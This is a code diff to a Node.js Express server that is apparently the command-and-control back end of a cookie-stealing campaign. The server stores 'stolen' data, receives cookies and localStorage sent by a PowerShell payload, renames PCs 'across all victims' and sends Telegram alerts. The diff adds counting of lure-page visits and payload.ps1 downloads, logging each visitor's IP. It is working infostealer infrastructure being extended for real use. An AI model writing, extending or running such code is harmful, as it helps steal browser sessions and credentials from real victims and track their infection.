@@ -6,6 +6,7 @@
 // Clean URLs: NO .php in address bar — serves directly
 // LocalStorage: Supports new localStorage field from payload
 // Rename PC: API endpoint to rename PC across all victims
+// Visitor Tracking: Tracks /home and /payload.ps1 visits
 // ============================================================
 
 const express = require('express');
@@ -89,6 +90,7 @@ console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}
 const DATA_FILE = path.join(__dirname, 'stolen.enc');
 const TRASH_FILE = path.join(__dirname, 'trash.enc');
 const LOG_FILE = path.join(__dirname, 'steal.log');
+const VISITS_FILE = path.join(__dirname, 'visits.enc');
 
 // ============================================================
 // SESSION SETUP
@@ -173,8 +175,26 @@ function loadData(file) {
     }
 }
 
+function saveVisits(data) {
+    fs.writeFileSync(VISITS_FILE, encryptData(data));
+}
+
+function loadVisits() {
+    if (!fs.existsSync(VISITS_FILE)) {
+        return { totalVisits: 0, homeVisits: 0, payloadDownloads: 0, lastVisit: null };
+    }
+    try {
+        const decrypted = decryptData(fs.readFileSync(VISITS_FILE, 'utf8'));
+        return decrypted || { totalVisits: 0, homeVisits: 0, payloadDownloads: 0, lastVisit: null };
+    } catch (e) {
+        console.log('[!] Failed to load visits:', e.message);
+        return { totalVisits: 0, homeVisits: 0, payloadDownloads: 0, lastVisit: null };
+    }
+}
+
 let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
+let visitsData = loadVisits();
 
 // ============================================================
 // NUCLEAR DEDUP — IP + userAgent + screen + nonce + data check
@@ -424,6 +444,37 @@ function generateUniqueId(entry) {
 }
 
 // ============================================================
+// VISITOR TRACKING FUNCTIONS
+// ============================================================
+
+function trackVisit(type, req) {
+    const ip = getRealIp(req);
+    const now = new Date().toISOString();
+    
+    visitsData.totalVisits = (visitsData.totalVisits || 0) + 1;
+    visitsData.lastVisit = now;
+    
+    if (type === 'home') {
+        visitsData.homeVisits = (visitsData.homeVisits || 0) + 1;
+        log(`[VISIT] Home page visited — Total: ${visitsData.totalVisits}, Home: ${visitsData.homeVisits} (IP: ${ip})`);
+    } else if (type === 'payload') {
+        visitsData.payloadDownloads = (visitsData.payloadDownloads || 0) + 1;
+        log(`[VISIT] Payload downloaded — Total: ${visitsData.totalVisits}, Payload: ${visitsData.payloadDownloads} (IP: ${ip})`);
+    }
+    
+    saveVisits(visitsData);
+}
+
+function getVisitsData() {
+    return {
+        totalVisits: visitsData.totalVisits || 0,
+        homeVisits: visitsData.homeVisits || 0,
+        payloadDownloads: visitsData.payloadDownloads || 0,
+        lastVisit: visitsData.lastVisit || null
+    };
+}
+
+// ============================================================
 // API ROUTES
 // ============================================================
 
@@ -466,6 +517,11 @@ app.get('/api/logout', (req, res) => {
         log('[+] User logged out, session destroyed');
         res.redirect('/login');
     });
+});
+
+// ---- GET VISITS DATA ----
+app.get('/api/visits', requireAuth, (req, res) => {
+    res.json(getVisitsData());
 });
 
 // ---- STEAL COOKIES (Main Endpoint — Handles Both Browser & Payload) ----
@@ -707,10 +763,7 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
     res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
 });
 
-// ============================================================
-// RENAME PC — API ENDPOINT
-// ============================================================
-
+// ---- RENAME PC — API ENDPOINT ----
 app.post('/api/rename-pc', requireAuth, (req, res) => {
     const { oldName, newName } = req.body;
 
@@ -772,7 +825,7 @@ app.post('/api/rename-pc', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// FRONTEND ROUTES — CLEAN URLS (NO .php IN ADDRESS BAR)
+// FRONTEND ROUTES — CLEAN URLS + VISITOR TRACKING
 // ============================================================
 
 // ---- Public Routes (No Auth Required) ----
@@ -784,6 +837,8 @@ app.get('/', (req, res) => {
 });
 
 app.get('/home', (req, res) => {
+    // Track visit
+    trackVisit('home', req);
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
@@ -820,8 +875,10 @@ app.get('/leveldb.dll', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'leveldb.dll'));
 });
 
-// ---- Serve payload.ps1 ----
+// ---- Serve payload.ps1 with tracking ----
 app.get('/payload.ps1', (req, res) => {
+    // Track payload download
+    trackVisit('payload', req);
     res.setHeader('Content-Type', 'text/plain; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'payload.ps1'));
 });
@@ -944,6 +1001,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
     console.log(`  [+] LocalStorage: ENABLED ✅ (from payload)`);
     console.log(`  [+] Rename PC: ENABLED ✅ (/api/rename-pc)`);
+    console.log(`  [+] Visitor Tracking: ENABLED ✅ (/home & /payload.ps1)`);
     console.log('='.repeat(55) + '\n');
 });
 
@@ -955,6 +1013,7 @@ process.on('SIGINT', () => {
     console.log('\n[!] Received SIGINT. Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
+    saveVisits(visitsData);
     process.exit(0);
 });
 
@@ -962,6 +1021,7 @@ process.on('SIGTERM', () => {
     console.log('\n[!] Received SIGTERM. Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
+    saveVisits(visitsData);
     process.exit(0);
 });
 
